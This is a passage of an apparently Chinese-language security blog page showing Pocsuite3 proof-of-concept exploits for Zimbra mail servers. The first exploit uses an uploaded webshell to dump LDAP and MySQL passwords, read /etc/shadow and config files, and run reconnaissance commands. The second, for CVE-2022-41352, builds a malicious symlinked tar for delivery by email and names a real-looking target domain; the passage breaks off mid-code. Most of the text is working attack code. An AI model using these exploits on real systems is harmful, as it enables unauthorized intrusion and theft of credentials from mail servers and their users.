endpoint, data=zippedfile, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                    ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">                        flag = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.upload_webshell():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#webshell路径及参数名</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure>

<p>POC运行结果如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" title="844315bf-c382-4478-9a91-a3f8bf5e4974" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" alt="844315bf-c382-4478-9a91-a3f8bf5e4974"></a></p>
<h2 id="CVE-2022-41352-Zimbra-Unauthenticated-RCE"><a href="#CVE-2022-41352-Zimbra-Unauthenticated-RCE" class="headerlink" title="CVE-2022-41352 Zimbra Unauthenticated RCE"></a>CVE-2022-41352 Zimbra Unauthenticated RCE</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Zimbra Collaboration（ZCS）8.8.15 和 9.0中，攻击者可以利用cpio漏洞通过amavisd上传任意文件到web目录&#x2F;opt&#x2F;zimbra&#x2F;jetty&#x2F;webapps&#x2F;zimbra&#x2F;public，从而导致未授权远程代码执行。 Zimbra建议用户使用pax代替cpio，虽然安装pax是Ubuntu上安装Zimbra的前提条件，但是在RHEL 6（或CentOS 6）之后，Red Hat发行版不再默认安装pax。</p>
<h3 id="Pocsuite-POC-2"><a href="#Pocsuite-POC-2" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.application <span class="keyword">import</span> MIMEApplication</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra Unauthenticated RCE&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;远程代码执行&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;验证&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-41352&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt;9.0.0.p27&#x27;</span>, <span class="string">&#x27;Zimbra &lt;8.8.15.p34&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra 网络客户端登录&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra是著名的开源系统，提供了一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。一体化地提供了邮件收发、文件共享、协同办公、即时聊天等一系列解决方案，是开源软件中的精品。</span></span><br><span class="line"><span class="string">    作为邮件服务器系统，Zimbra更是凭借卓越的稳定性和功能当之无愧地成为开源邮件服务器系统的首选，适合各类型/人数的用户群，尤其适合团队使用。</span></span><br><span class="line"><span class="string">    其最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在Zimbra Collaboration（ZCS）8.8.15 和 9.0中，攻击者可以利用cpio漏洞通过amavisd上传任意文件到web目录/opt/zimbra/jetty/webapps/zimbra/public，从而导致未授权远程代码执行。</span></span><br><span class="line"><span class="string">    Zimbra建议用户使用pax代替cpio，虽然安装pax是Ubuntu上安装Zimbra的前提条件，但是在RHEL 6（或CentOS 6）之后，Red Hat发行版不再默认安装pax。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    要修复此漏洞，请应用最新的修补程序，或者安装pax并重新启动服务器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P27</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = [<span class="string">&#x27;https://mail.realclubdelima.org.pe&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_tar_payload</span>(<span class="params">self, payload, payload_name, payload_path, lnk=<span class="string">&#x27;startup&#x27;</span></span>):</span><br><span class="line">        <span class="comment"># Block 1</span></span><br><span class="line">        link = lnk.encode()</span><br><span class="line">        mode = <span class="string">b&#x27;0000777\x00&#x27;</span>  <span class="comment"># link permissions</span></span><br><span class="line">        ouid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal uid (997)</span></span><br><span class="line">        ogid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal gid</span></span><br><span class="line">        lnsz = <span class="string">b&#x27;00000000000\x00&#x27;</span>  <span class="comment"># file size (link = 0)</span></span><br><span class="line">        lmod = <span class="string">b&#x27;14227770134\x00&#x27;</span>  <span class="comment"># last modified (octal unix)</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;2&#x27;</span>  <span class="comment"># type (link = 2)</span></span><br><span class="line">        targ = payload_path.encode()  <span class="comment"># link target</span></span><br><span class="line">        magi = <span class="string">b&#x27;ustar  \x00&#x27;</span>  <span class="comment"># ustar magic bytes + version</span></span><br><span class="line">        ownu = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># user owner</span></span><br><span class="line">        owng = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># group owner</span></span><br><span class="line">        vers = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>  <span class="comment"># device major and minor</span></span><br><span class="line">        pref = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">155</span>  <span class="comment"># prefix (only used if the file name length exceeds 100)</span></span><br><span class="line"></span><br><span class="line">        raw_b1_1 = link + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(link)) + mode + ouid + ogid + lnsz + lmod</span><br><span class="line">        raw_b1_2 = <span class="built_in">type</span> + targ + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(targ)) + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b1_1 + csum + raw_b1_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b1 = raw_b1_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b1_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b1 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b1))</span><br><span class="line">        <span class="comment"># Block 2</span></span><br><span class="line">        mode = <span class="string">b&#x27;0000644\x00&#x27;</span>  <span class="comment"># file permissions</span></span><br><span class="line">        file = <span class="string">f&#x27;<span class="subst">&#123;lnk&#125;</span>/<span class="subst">&#123;payload_name&#125;</span>&#x27;</span>.encode()</span><br><span class="line">        flsz = <span class="built_in">oct</span>(<span class="built_in">len</span>(payload))[<span class="number">2</span>:]  <span class="comment"># file size</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;0&#x27;</span>  <span class="comment"># type (file = 0)</span></span><br><span class="line">        targ = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">100</span>  <span class="comment"># link target = none</span></span><br><span class="line"></span><br><span class="line">        raw_b2_1 = file + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(file)) + mode + ouid + ogid + <span class="string">f&#x27;<span class="subst">&#123;flsz:&gt;011&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + lmod</span><br><span class="line">        raw_b2_2 = <span class="built_in">type</span> + targ + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b2_1 + csum + raw_b2_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b2 = raw_b2_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b2_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b2 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b2))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assemble</span></span><br><span class="line">        raw_tar = raw_b1 + raw_b2 + payload + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">512</span>-(<span class="built_in">len</span>(payload)%<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">        raw_tar += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">512</span> * <span class="number">2</span>  <span class="comment"># Trailer: end with 2 empty blocks</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> raw_tar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">smtp_send_file</span>(<span class="params">self, target, sender, recipient, subject, body, attachment, attachment_name</span>):</span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span 